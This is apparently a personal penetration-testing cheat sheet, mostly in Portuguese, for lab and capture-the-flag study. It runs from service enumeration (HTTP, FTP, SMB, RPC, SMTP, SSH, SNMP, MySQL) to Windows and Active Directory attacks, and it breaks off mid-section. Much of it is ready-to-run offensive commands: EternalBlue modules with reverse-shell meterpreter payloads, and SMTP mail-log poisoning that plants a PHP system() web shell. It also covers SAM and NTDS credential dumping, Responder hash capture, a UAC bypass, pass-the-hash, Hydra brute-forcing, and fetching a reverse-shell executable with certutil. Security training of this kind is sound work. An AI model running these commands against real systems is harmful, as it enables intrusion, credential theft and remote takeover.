



# http (80)
- http 1.1 requer Host no header

**parâmetros HTTP**
```
GET / HTTP/1.1
Host: mercury.picoctf.net:46199
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: mercury.picoctf.net:46199
Date: Tue, 26 Feb 2018 14:30:00 GMT
DNT: 0 # DNT (0 = trackeia o request, 1 = não trackeia o request)
X-Forwarded-For: 102.177.146.1 # sweeden IP
Accept-Language: sv # sweedish
Content-Length: 0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
## aspx

enumerando versão do aspx
```
└─$ nc -v 10.10.11.14 80
Connection to 10.10.11.14 80 port [tcp/http] succeeded!
HEAD /index.aspx HTTP/1.0

HTTP/1.1 404 Not Found
Cache-Control: private
Content-Length: 1960
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 29 Aug 2024 19:16:34 GMT
Connection: close

```

```
└─$ nc -v 10.10.10.10 80
GET /index.aspx HTTP/1.1
Host: 10.10.10.10

HTTP/1.1 404 Not Found
Cache-Control: private
Content-Length: 1960
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 29 Aug 2024 19:16:34 GMT
Connection: close
```


## https (443)
porta padrão: 443
```
openssl s_client -connect www.example.com:443 -quiet
```

# Firewall
```
wafw00f example.com
```


# ftp (21)
O FTP permite o envio e recebimento de arquivos.
Em alguns casos o ftp permite o login apenas com o usuário e senha vazia.
O firewall tende a ser menos restritivo com o modo passivo
```
ftp ftp://usuario:senha@host:2121 # login com credenciais

ftp 192.168.0.8 -P 21
ftp USER@HOST PORT


# conexão via nc
nc -v 172.16.1.245 2121
172.16.1.245 [172.16.1.245] 2121 (iprop) open
USER decstore
PASS d3c5t0r3
```

**baixar todos os arquivos do servidor**
```
ftp> prompt  # desativa a interação com o servidor
ftp> mget *  # baixa todos os arquivos
```

mover um arquivo de diretorio:
```
rename arquivo.txt novo_diretorio/arquivo.txt
```

**comandos úteis do FTP:**
1. more teste := abre o arquivo teste
2. dir
	Descrição: lista os arquivos do diretório.
3. get
	Descrição: Baixa um arquivo do servidor FTP para o diretório local.
4. mget
	Descrição: Baixa múltiplos arquivos do servidor FTP para o diretório local.
5. put
	Descrição: Envia um arquivo do diretório local para o servidor FTP.
5. mput
	Descrição: Envia múltiplos arquivos do diretório local para o servidor FTP.

## configuração do servidor ftp
verifica se já está instalado
```
dpkg -l | grep -E 'vsftpd|proftpd|pure-ftpd'
```

instala:
```
sudo apt install vsftpd
```

inicia o servidor ftp
```
sudo systemctl start vsftpd
```

diretório raiz do servidor FTP
```
/srv/ftp
```

arquivo de configuração
```
/etc/vsftpd.conf
```



# NetBios (139/tcp)   / SMB (445/tcp)
Permite o compartilhamento de arquivos/diretórios na rede.


NetBios (porta 139) --> antigo
SMB (porta 445) --> mais recente

Null section e list directory
```
smbclient -L \\\\10.10.11.35\\ -N
```

enum shared:
```
nmap --script smb-enum-shares -p 445 172.16.1.145 -Pn
crackmapexec smb 172.16.1.145 --shares
smbclient -L 172.16.1.145 -N
```

**Vulnerável a EternalBlue (MS17-010):**
```
nmap --script smb-protocols -p 445 <HOST> -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 12:06 EDT
Nmap scan report for 172.16.1.145 (172.16.1.145)
Host is up (0.15s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]    # VULNERAVEL A EternalBlue
|     2:0:2
|_    2:1:0

```

modulo para validar a vulnerabilidade ao eternalblue:
```
scanner/smb/smb_ms17_010

[+] 172.16.1.145:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1

```
módulo para exploitar o eternalblue:
```
exploit/windows/smb/ms17_010_psexec
exploit/windows/smb/ms17_010_eternalblue
```
**Settins architecture of the payload**
```
set PAYLOAD windows/x86/meterpreter/reverse_tcp   # 32 bits
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # 64 bits

```

estabelece conexão passando usuário e senha
```
smbclient  \\\\10.10.11.35\\SYSVOL\\ -U "user%pass" 
```

```
smbclient \\\\172.30.0.103\\Utils$\\ -U dev01%dev0105 --workgroup=SRV01
```

lista os diretórios compartilhados (`--workgroup`)
```
smbclient -L \\\\10.10.11.35
smbclient -L \\\\10.10.11.35 --workgroup cicada.htb
Password for [WORKGROUP\user]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

```

lista usando protocolo v2 e v3:
```
smbclient -L \\10.10.11.35 -N -m SMB2
smbclient -L \\10.10.11.35 -N -m SMB3
```


Identifica hosts e informações de NetBIOS em uma rede (classe C)
```
sudo nbtscan 192.168.0.0/24

192.168.0.1    <00> UNIQUE   "MYPC"       [MYGROUP]
192.168.0.2    <00> UNIQUE   "ANOTHERTPC" [MYGROUP]
192.168.0.3    <00> UNIQUE   "SERVER"     [MYGROUP]

```

Em alguns casos o netbios/smb permite o login apenas com o usuário e senha vazia.
```
smbclient \\hostname/sharename -U username%
```
- `%` indica que a senha está em branco.


conectando ao servidor com null session
```
smbclient -L \\192.168.0.8 --option='client min protocol=NT1' -N
```

conectando ao servidor smb com usuario
```
smbclient -L \\192.168.0.8 --option='client min protocol=NT1' -U admin%admin123
```
- **`-L \\192.168.0.8`**: Lista os compartilhamentos disponíveis no servidor SMB especificado pelo endereço IP `192.168.0.8`.
- **`--option='client min protocol=NT1'`**: Define a opção para usar o protocolo SMBv1 (NT1), necessário para compatibilidade com sistemas que não suportam protocolos mais recentes.
- **`-U admin%admin123`**: Fornece as credenciais de login para autenticação. O formato `user%password` é usado para passar o nome de usuário e a senha diretamente na linha de comando.


**Comandos Úteis:**
ls
	Descrição: Lista os arquivos e diretórios no diretório atual do servidor SMB.
get
	Descrição: Baixa um arquivo do servidor SMB para o diretório local.
mget
	Descrição: Baixa múltiplos arquivos do servidor SMB para o diretório local.
put
	Descrição: Envia um arquivo do diretório local para o servidor SMB.
mput
	Descrição: Envia múltiplos arquivos do diretório local para o servidor SMB.
del
	Descrição: Exclui um arquivo no servidor SMB.
rmdir
	Descrição: Remove um diretório no servidor SMB.
mkdir
	Descrição: Cria um novo diretório no servidor SMB.
pwd
	Descrição: Exibe o diretório de trabalho atual no servidor SMB.
stat
	Descrição: Mostra informações detalhadas sobre um arquivo ou diretório.
exit ou quit


enumerate if the host is 32bits or 64bits
```
nmap -p 445 --script smb-os-discovery 172.16.1.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 09:46 EDT
Nmap scan report for ORIONSCORP (172.16.1.145)
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: USUARIO-PC
|   NetBIOS computer name: USUARIO-PC\x00
|   Workgroup: ORIONSCORP\x00
|_  System time: 2025-04-01T10:38:51-03:00

Nmap done: 1 IP address (1 host up) scanned in 4.21 seconds

```

## Host windows
**ex nbtstat**
serve para identificar informações do host
```
nbtstat -A 192.168.1.1
```

**Flags importantes:**
- **`-a <NomeRemoto>`**: Exibe a tabela de nomes NetBIOS de um computador remoto, especificado pelo nome.
    
- **`-A <EndereçoIP>`**: Exibe a tabela de nomes NetBIOS de um computador remoto, especificado pelo endereço IP.
    
- **`-c`**: Exibe o conteúdo do cache da tabela de nomes NetBIOS, mostrando os nomes que foram recentemente resolvidos para endereços IP.
    
- **`-n`**: Exibe a tabela de nomes NetBIOS local. Esta tabela contém os nomes NetBIOS registrados no computador local.
    
- **`-r`**: Exibe as estatísticas de resolução de nomes, mostrando quantos nomes foram resolvidos através de broadcast e quantos foram resolvidos via WINS (Windows Internet Name Service).
    
- **`-R`**: Limpa e recarrega a tabela de nomes remotos do cache de nomes NetBIOS.
    
- **`-S`**: Exibe as sessões abertas com seus endereços IP associados.
    
- **`-s`**: Similar ao `-S`, mas resolve os endereços IP para nomes de host, se possível.


**net view**
serve para visualizarmos se o host oferece um serviço de compartilhamento
```
net view \\192.168.1.1

Nome do Servidor     Comentário
-------------------------------------------------------------------------------
\\COMPUTADOR1        Compartilhamento de arquivos e impressoras
\\COMPUTADOR2        Compartilhamento de documentos


```

**net use**
serve para estabelecer uma conexão com o host

ex com null session
```
net use \\192.168.1.1 "" /u:""
```

ex com usuário e senha
```
net use \\192.168.1.1 "senha" /u:"usuario"
```

ex com diretório
```
net use Z: \\192.168.1.1\opt
```
obs: `Z` Especifica a letra da unidade de rede que você deseja usar para mapear o recurso compartilhado. Poderia ser qualquer letra que não estiver sendo utilizada

Para excluir basta utilizar o comando
```
net use Z: /delete
```

# Remote Procedure Call - RPC  (135/tcp)
O RPC é uma API que permite a um programa executar um procedimento (ou função) em outro espaço de endereço, como em um servidor remoto, como se fosse uma chamada local
conectando ao servidor com usuário e senha
```
rpcclient -U <username>%<password> <hostname_or_ip>
```
conectando ao servidor via Null Session
```
rpcclient -U "" -N <hostname_or_ip>
```

**Comando help**
```
rpcclient $> ?
```

**Enumerar Usuários**
```
rpcclient $> enumdomusers
```
Este comando lista todos os usuários do domínio.

**Enumerar Grupos:**
```
rpcclient $> enumdomgroups
```
Este comando lista todos os grupos do domínio.

**Obter Informações de um Usuário Específico:**
```
rpcclient $> queryuser <username>
```
Substitua `<username>` pelo nome do usuário para obter informações sobre esse usuário.

**Listar Compartilhamentos**:
```
rpcclient $> netshare
```

```
rpcclient $> netshareenum
```

```
rpcclient $> netshareenumall
```
Estes comandos listam os compartilhamentos disponíveis no servidor.
Obs: O comando `netshare` mostra menos informações que o `netshareenum`, que por sua vez mostra menos informações do `netshareenumall`.

**Verificar o Status do Servidor**:
```
rpcclient $> srvinfo
```
Este comando fornece informações sobre o servidor, como versão e nome.
# pop3 (110)
serviço de email
porta padrão: 110

Inicia conexão:
```
telnet <ip> <porta>
```

Login:
```
user admin
pass admin123
```

Em alguns casos o netbios/smb permite o login apenas com o usuário e senha vazia.
```
USER username
PASS
```

Comandos úteis:
1. TOP \[message index\] \[num lines to return\]

# SMTP (25)
O SMTP (Simple Mail Transfer Protocol) é um protocolo de comunicação utilizado para enviar e transferir e-mails entre servidores de e-mail e clientes.
- **SMTP enumeration** https://www.geeksforgeeks.org/smtp-enumeration/
enumeração de hosts
```
use auxiliary/scanner/smtp/smtp_enum 
set RHOSTS <IP>
set rport <PORT>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run
```

```
telnet [IP] [PORT]
```

exemplo de resposta quando o usuário existe
```
EHLO root
250 2.1.5 OK

VRFY root
250 2.1.5 OK

VRFY www-data
250 2.1.5 OK
```

exemplo de resposta quando o usuário não existe
```
EHLO jhayson
550 5.1.1 User unknown

VRFY asdasasdasdasdas
550 5.1.1 User unknown

VRFY www-kasdjas
550 5.1.1 <www-dasdasda>: Recipient address rejected: User unknown in local recipient table
```


obs: podemos enviar um email para um determinador usuário para enumerar se o usuário em questão existe ou não. De acordo com a resposta recebida podemos definir se o usuário existe ou não.

path do postfix `/var/spool/mail/www-data`


diretorios de email smtp
```
/var/mail/USER
/var/spool/mail/USER
/var/mail/www-data
/var/spool/mail/www-data
```

**RCE via smtp**
```
telnet 172.30.0.128 25
Trying 172.30.0.128...
Connected to 172.30.0.128.
Escape character is '^]'.
MAIL FROM:romio
RCPT220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)
 250 2.1.0 Ok
RCPT TO:www-data@ubuntu.local   
502 5.5.2 Error: command not recognized
MAIL FROM:romio
503 5.5.1 Error: nested MAIL command
RCPT TO:www-data@ubuntu.local
250 2.1.5 Ok
data 
354 End data with <CR><LF>.<CR><LF>
<?php echo system($_GET['hack']);?>
.
250 2.0.0 Ok: queued as 23781C007F


# requisição
http://172.30.0.128/supportdesk/index.php?page=/var/mail/www-data&hack=whoami

```


# Enumerando Dispositivos de Rede
porta default: 23

ex de dispositivos de rede firewall, routers e switchs
uma vez que identificamos o modelo do dispositivo, podemos consultar o manual do fabricante, podemos realizar login telnet com as credenciais default.

sites para consulta de credenciais default:
1. https://cirt.net/passwords
2. https://datarecovery.com/rd/default-passwords/

conexão com o servidor
```
telnet <ip> <porta>
```

# ssh (22/2222/22222 TCP)
Permite conexão de shell remota
Portas default: 22, 2222, 22222

Conexão
```
ssh user@IP
```

**arquivo de configuração**
```
/etc/ssh/sshd_config
```
Estrutura comum de um diretório `.ssh`:
```
~/.ssh/
├── authorized_keys
├── id_rsa
├── id_rsa.pub
├── id_ecdsa
├── id_ecdsa.pub
├── id_ed25519
├── id_ed25519.pub
├── id_dsa
├── id_dsa.pub
├── known_hosts
├── config
├── ssh_config
└── ssh_known_hosts

```

ex de banner grabbing
```
nc <IP>
```

Métodos de autenticação:
```
ssh -v root@192.168.0.8

Authentications that can continue: publickey,password
```

## Autenticação com chave pública
basta adicionar a nossa chave pública no arquivo `authorized_keys`

gerando par de chave público/privada
```
ssh-keygen
id_rsa  id_rsa.pub
```
- `id_rsa` é a chave privada
- `id_rsa.pub` é a chave pública

## Arquivo de configuração
path `/etc/ssh/sshd_config`

alterando a porta default:
antes
```
#   Port 22
```

depois
```
#   Port 22
```

Login de root via ssh:
Nem sempre é permitido logar com root via ssh

antes
```
PermitRootLogin no
```
https://www.veerotech.net/kb/how-to-disable-ssh-login-for-root-user/

depois
```
PermitRootLogin yes
```
https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/v2v_guide/preparation_before_the_p2v_migration-enable_root_login_over_ssh

### erro de negociacao
Unable to negotiate with 172.16.1.177 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

```
ssh -o HostkeyAlgorithms=+ssh-rsa USER@IP
```
# SNMP
Protocolo para gerenciamento de dispostivos de rede, encontrado em switchs, roteadores e servidores.
porta default: 161 (UDP)

OID (Object identifier): 

site para mapear o OID: 
http://www.oid-info.com/
https://www.alvestrand.no/objectid/1.3.6.1.2.1.1.html

MIB (Management Information Base):

**Community:** Community em SNMP é um tipo de "senha" usada para controlar o acesso aos dispositivos gerenciados. Ele serve como um mecanismo básico de autenticação, especialmente nas versões SNMPv1 e SNMPv2c.
Dica: podemos pesquisar por communities padrões no manual do fabricante.

**Enumerando SNMP:**
```
nmap -sVU -p161 -Pn <IP>
```

Programa para mapear as communities de um host
```
onesixtyone -c community.txt 192.168.0.1/24
```

## snmpwalk
snmpwalk é um utilitário para interagir com o protocolo SNMP

exemplos de uso:
```
# Enumerating the Entire MIB Tree
> snmpwalk  -c public -v1 192.168.11.219

# Enumerating Windows Users:
> snmpwalk -c public -v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25

# Enumerating Running Windows Processes:
> snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2

# Enumerating Open TCP Ports:
> snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.6.13.1.3

# Enumerating Installed Software:
> snmpwalk -c public v1 192.168.11.204 1.3.6.1.2.1.25.6.3.1.2
```
https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/INFO-GATH/CHEATSHEETS/snmb_enumeration.md

## snmptranslate
O snmp converte OIDs para MIB e MIB para OIDs, ou seja, permite a conversão bidirecional entre OIDs (Object Identifiers) numéricos e seus nomes de texto descritivos dentro da MIB (Management Information Base)

pesquisa por uma função
```
snmptranslate -Td
```

```
snmptranslate -Td -On system.sysUpTime
```
- **`-Td`**: Mostra uma descrição detalhada do OID.
- **`-On`**: Exibe a versão numérica do OID.

Em alguns casos é necessário baixar um tradutor desses OIDs
```
apt search mibs
snmp-mibs-downloader/jammy,jammy 1.5 all
  install and manage Management Information Base (MIB) files

```
Instala o pacote
```
sudo apt install snmp-mibs-downloader
```

cria o arquivo de configuração
```
echo "" > /etc/snmp/snmp.conf
```


# mysql
porta default: 3306

testar credenciais default

conexão com o servidor (senha nula) e usuário mysql/root
```
mysql -h 192.168.0.5 -u mysql
mysql -h 192.168.0.5 -u root
```

```
mysql -u <username> -p -h <hostname> -P <port> <database>
```

configuration files:
```
/etc/mysql/mysql.conf.d/
/etc/mysql/my.cnf
```

# msfconsole

faz/desfaz o set
```
unset vhost <IP>
set vhost <IP>
```

procura por um módulo
```
search eternalblue
```

create a workspace
```
workspace -a desec
```

switch to workspace
```
workspace desec
```

nmap and store results
```
db_nmap -sC -sV -v -Pn <IP>
```

show previous hosts
```
hosts
```

consult previous nmap results
```
services
services 172.30.0.103
```

Após conseguir uma shell evoluir para meterpreter:
```
meterpreter > background

use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION 1
msf6 post(shell_to_meterpreter) > run

# mensagem de êxito
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.16.190:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.244.106
[*] Meterpreter session 2 opened (10.2.16.190:4433 -> 10.10.244.106:49197) at 2025-04-01 11:56:18 -0400
[*] Stopping exploit/multi/handler

> sessions -i 2
```
Meterpreter permite:    
- Upload/download de arquivos.
- Keylogging.
- Pivoting (redirecionamento de tráfego).     
- Migração para outros processos.
## meterpreter
```
search -f *key* C:\\
```

Para fazer download e upload de um arquivo
```
download <file>
upload <file>
```

whoami do meterpreter
```
getuid
```

utiliza a shell padrão do sistema
```
shell
```

# windows
**enumerar versão**
```
systeminfo
```

**Obtaining AD users’ hashes or local hashes:**
```
vssadmin create shadow /for=C:
copy <shadow-volume>\Windows\NTDS\ntds.dit <ntds>
copy <shadow-volume>\Windows\system32\config\system <system>
copy <shadow-volume>\Windows\system32\config\sam <sam>

impacket-secretsdump -ntds <ntds> -system <system> LOCAL
impacket-secretsdump <user>:<pass>@<host>
```

**Capturing hashes by registry:**
```
reg save hklm\sam C:\sam_copy
reg save hklm\system C:\system_copy
impacket-secretsdump -sam <sam> -system <system> LOCAL
```
- `LOCAL` indica que você **não está se conectando a um host remoto**, mas sim extraindo os hashes **localmente**, a partir dos arquivos `SAM` e `SYSTEM` que você possui

**versões de hash no windows (mais antigos pro mais recentes)**
- LM (geralmente termina com `EE`, se  começar com `AA` e terminar com `EE` está em desuso)
- NTLM = NTLM V1
- NTLM V2


**Path for hashes:**
```
C:\Windows\system32\config\SAM                        usuarios windows 7,8,10,11
C:\Windows\system32\NTDS\ntds.dit                    usuarios do windows server
C:\Windows\system32\config\SYSTEM                 usuarios windows 7,8,10,11
```

Bypass User Account Control (UAC):
```
exploit/windows/local/bypassuac_fodhelper
exploit/windows/local/ask (exige interação com usuário)
```

windows antigo , testar eternalblue:
```
exploit/windows/smb/ms17_010_psexec
exploit/windows/smb/ms17_010_eternalblue
```

## Cracking hashes (hashdump)
john
```
john --format=lm --wordlist=<wordlist> <hashfile>
john --format=nt --wordlist=<wordlist> <hashfile>
```

**hashcat NT/NTLM**

Para quebrar usando hashcat é preciso formatar as hashes do hashdump para o formato adequado

```
# hashes não formatadas
ADM01:1009:aad3b435b51404eeaad3b435b51404ee:25c22286c527ef085b2541e97c740587:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1f233b4583731263d8c54659889dc0a:::
CPD01:1006:aad3b435b51404eeaad3b435b51404ee:9b6f9e9dd57c57c4f6ff2a5e8c819cdc:::
DEV01:1007:aad3b435b51404eeaad3b435b51404ee:5288d36e2a539296875b393aa763bfcc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
USER01:1008:aad3b435b51404eeaad3b435b51404ee:9e40973e2cb458449cb1ce3f4a2a2d6b:::


# comando para formatar as hashes rapidamente
cat hash_desformatadas | cut -d ':' -f3


# hash formatadas
25c22286c527ef085b2541e97c740587
b1f233b4583731263d8c54659889dc0a
9b6f9e9dd57c57c4f6ff2a5e8c819cdc
5288d36e2a539296875b393aa763bfcc
31d6cfe0d16ae931b73c59d7e0c089c0
9e40973e2cb458449cb1ce3f4a2a2d6b
```

quebra da hash nt usando hashcat
```
hashcat -m 1000 hash_formatada.txt WORDLIST
```


**hashes da RAM:**
```
/usr/share/windows-resources/wce/wce-universal.exe
/usr/share/windows-binaries/fgdump/fgdump.exe
```

extração de senhas em texto plano
```
wce.exe -w
```
O parâmetro `-w` ativa a busca por senhas em texto claro armazenadas no Digest Authentication Package.


mimikatz para pegar credenciais
```
wdigest
```

## obtendo shell/ validando usuário
validando credenciais:
```
winexe -U USER%PASS //HOST cmd.exe
```

```
sudo crackmapexec smb 172.16.1.145               
sudo crackmapexec smb hosts.txt -d cicada.htb -u <USER> -p <PASS>
```

```
exploit/windows/smb/psexec

Em alguns casos vai ter que mudar o target para conseguir shell
    Id  Name
    --  ----
=>  0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
    4   Command

```

```
pth-winexe -U bernardo%HASH //HOST cmd.exe
```

```
responder -I <interface> -Pbv
responder -I tun0 -Pbv
```

ntlmv2 (hashcat 5600 e john netntlmv2)
```
hashcat -m 5600 HASH.txt WORDLIST 
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**dcc2 (hashcat 2100 e john mscash2)**
```
hashcat -m 2100 HASH.txt WORDLIST
john --format=mscash2 hash_secretdump --wordlist=~/wordlist/rockyou.txt

hash formatada:
$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d
```
note que a hash precisa estar corretamente formatada


obtendo hashes a partir de um usuário validado
```
impacket-secretsdump DOMAIN/USER:PASS@HOST
```

formatando hash do impacket-secretdump
```
hash capturada:
ORIONSCORP2.LOCAL/thenrique:$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d:

hash formatada:
$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d
```

**Habilitando RDP com credenciais validadas:**
```
crackmapexec smb HOST -u USER -p PASS -M rdp
```

## dir
pesquisa recursivamente pelo diretorio
```
dir <directory_name> /ad /b /s
```
- `/ad` → procura apenas diretórios (folders).
- `/b` → mostra o caminho completo no formato simples (bare format).
- `/s` → busca recursivamente em todas as subpastas.


## enumeração de usuários do dóminio (AD)
```
rpcclient -W WORKGROUP -U USER HOST
```

enumera os usuarios do dominio
```
rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Convidado] rid:[0x1f5]
user:[DefaultAccount] rid:[0x1f7]
user:[Usuario] rid:[0x3e9]
user:[WDAGUtilityAccount] rid:[0x1f8]
```

enumera os grupos do dominio
```
rpcclient $> enumdomgroups 
group:[None] rid:[0x201]
```

enumera os membros de um grupo
```
rpcclient $> querygroupmem 0x201
        rid:[0x1f4] attr:[0x7]
        rid:[0x1f5] attr:[0x7]
        rid:[0x1f7] attr:[0x7]
        rid:[0x1f8] attr:[0x7]
        rid:[0x3e9] attr:[0x7]

```

query pra usuario WDAGUtilityAccount
```
queryuser 0x1f8
```

lista os comandos
```
rpcclient $> help
```
## enumeração de usuários
**enumerar usuários locais**
```
net user

User accounts for \\EC2AMAZ-I8UHO76

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Jenny                    John
The command completed successfully.
```

**powershell, enumerar usuários locais**
```
Get-LocalUser

Name           Enabled Description
----           ------- -----------
Administrator  True    Built-in account for administering the computer/domain
DefaultAccount False   A user account managed by the system.
Guest          True    Built-in account for guest access to the computer/domain
Jenny          True
John           True
```
obs: a coluna **`Enabled`** indica se a conta de usuário local está ativa (habilitada) ou desativada.

powershell, enumerar usuários locais com permissão de administradores:
```
Get-LocalGroupMember -Group "Administrators"

ObjectClass Name                          PrincipalSource
----------- ----                          ---------------
User        EC2AMAZ-I8UHO76\Administrator Local
User        EC2AMAZ-I8UHO76\Guest         Local
User        EC2AMAZ-I8UHO76\Jenny         Local
```

**enumerar privilégios de usuário**
```
whoami /priv
whoami /all
```

# Active Directory (AD)

## hashes na rede
arquivo de configuração
```
/etc/responder/Responder.conf

# acrescentar o IP alvo
RespondTo = 172.16.1.145
```
obs: altera a linha respondTo para incluir apenas os nossos hosts alvo

```
responder -I eth0 -Pv
```

## Remote Desktop Protocol (rdp port 3389)
utilitário para interagir com rdp no linux
```
xfreerdp
xfreerdp /v:<IP_do_host> /u:<nome_do_usuário> /p:<senha>
xfreerdp /v:10.10.39.3 /u:Administrator /p:letmein123!
```


# powershell
transferencia do arquivo rev via powershell
```
Invoke-WebRequest -Uri http://<meu_ip>:PORT/rev.exe -OutFile "C:\PATH"

iwr -uri http://<meu_ip>:PORT/rev.exe -outfile rev.exe
```
executar antes
```
python3 -m http.server <PORT>
```



# nc/netcat
transferencia de arquivos via nc:
```
nc -lvp PORT > FILE  # receiver

nc IP_ATTACKER PORT_OPPENED < FILE # sender
```
# cmd
transferencia do arquivo rev
```
certutil.exe -urlcache -split -f "http://<meu_ip>:PORT/rev.exe"
```
executar antes
```
python3 -m http.server <PORT>
```


## login
loggin bem sucedido
```
wevtutil qe Security "/q:*[System[EventID=4624]]" /f:text /c:10
```


login bem sucedidos filtrando pelo nome de usuário
```
wevtutil qe Security "/q:*[System[EventID=4624] and EventData[Data[@Name='TargetUserName']='john']]" /f:text /c:10
```
- `/q:*[System[EventID=4624]]`: Filtra eventos com ID 4624.
- `EventData[Data[@Name='TargetUserName']='john']`: Dentro dos dados do evento, filtra onde o nome do usuário é "john".
obs: caso a saida do comando acima seja nula, o usuário não fez login bem sucedido


loggin bem sucedido com usuário john em ordem anti-cronologica (mais recente pro mais antigo)
```
wevtutil qe Security "/q:*[System[EventID=4624] and EventData[Data[@Name='TargetUserName']='john']]" /f:text /c:10 /rd:true
```
- **`qe Security`**: Consulta o log de eventos de segurança.
- **`"/q:*[System[EventID=4624]]"`**: Filtra os eventos de logon bem-sucedido (ID 4624).
- **`/f:text`**: Formato de saída em texto.
- **`/rd:true`**: Inverte a ordem dos eventos, mostrando os mais recentes primeiro.

**Formato das datas:**
```
YYYY-MM-DDTHH:MM:SS.sss 
2019-03-02T17:48:32.199 

ano = 2019 
mes = 03
dia = 02
hora = 17
minuto = 48
segundo = 32
milissegundo = 199
```


# Hydra
bruteforce de serviços, ssh,ftp

ex ftp:
```
hydra -L users.txt -P pass.txt 192.168.0.8 ftp -s 21 
```

ex ssh:
```
hydra -L users.txt -P pass.txt 192.168.0.8 ssh -t 4 -s 22
```
Obs: no ssh é preciso limitar a quantidade de requisições paralelas usando `-t 4`

```
hydra -v -l <user> -p <pass> -M <targets> <protocol> 
hydra -v -L <user_list> -P <pass_list> <protocol>://<ip>:<port> 
```

bruteforce em http
```
hydra -v -L users.txt -P pass.txt URL http-post-form "/turismo/login.php:LOGIN_BUTTON_NAME=^USER^&PASS_BUTTON_NAME=^PASS^&SUBMIT_BUTTON_NAME:STRING_FILTER"


hydra -v -L users.txt -P pass.txt URL http-post-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:Incorreto"

```

**Flags úteis:**
-s PORT: porta do serviço
-L: path para lista de usuários
-P: path para lista de senhas
-C: path para arquivo no formato "login:pass"
-l: usuário em texto
-p: senha em texto
-s PORT
-W TIME
        defines a wait time between each connection a task performs. This usually only makes sense if a low task number is used, .e.g -t 1

## hydra.restore
when you cancel a hydra bruteforce, the program save a `./hydra.restore` file, to restore the bruteforce of previous try:
```
hydra -R
```
# cewl
pesquisar por uma string em um site
```
cewl URL -m LENGTH
```
-m, --min_word_length
                     Minimum word length, default 3.

# hashcat
- hash examples https://hashcat.net/wiki/doku.php?id=example_hashes

```
hashcat -m <hash_type> <hash_file> <wordlist>

# md5
hashcat -m 0 <hash_file> <wordlist>
```

listar exemplos de hashes:
```
hashcat --example-hashes
```

hashcat para identificar a hash
```
hashcat --identify aba63f26d5947a558d4fdbbbe4468965710520540ef3d48e0b3cbf79d6cba217
```

## previous results
```
#1 cracking the hash
hashcat -m 1000 hash_file /wordlist.txt

#2 showing the results
hashcat -m 1000 --show hash_file
```

## Hash Format
### passwd / shadow
| Hash Format                 | Hashcat Mode | Example              |
| --------------------------- | ------------ | -------------------- |
| **MD5** (`$1$`)             | `500`        | `$1$salt$hash`       |
| **SHA-256** (`$5$`)         | `7400`       | `$5$salt$hash`       |
| **SHA-512** (`$6$`)         | `1800`       | `$6$salt$hash`       |
| **bcrypt** (`$2a$`, `$2y$`) | `3200`       | `$2a$10$salt...hash` |


### hashcat to crack MySQL4.1/MySQL5   | Database Server (-m 300)
to crack with hashcat, we have to remove the `*`
```
# dumping from mysql database
debian-sys-maint | *B3CDEC7DC42B824697AC3919B8017F1C1BFBBF53      
root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 

# after format the hashes
B3CDEC7DC42B824697AC3919B8017F1C1BFBBF53
81F5E21E35407D884A6CD4A731AEBFB6AF209E1B

```

hashcat to crack MySQL4.1/MySQL5   | Database Server (-m 300)
```
hashcat -m 300 cred1 ~/wordlists/rockyou.txt
```

# john
john para transformar um zip com senha em uma hash
```
zip2john ~/Downloads/files.zip > hash.txt
```

john para quebrar uma hash
```
john --wordlist=~/wordlist/rockyou.txt hash.txt
```

lista os formatos de hash
```
john --list=formats
```

## unshadow
```
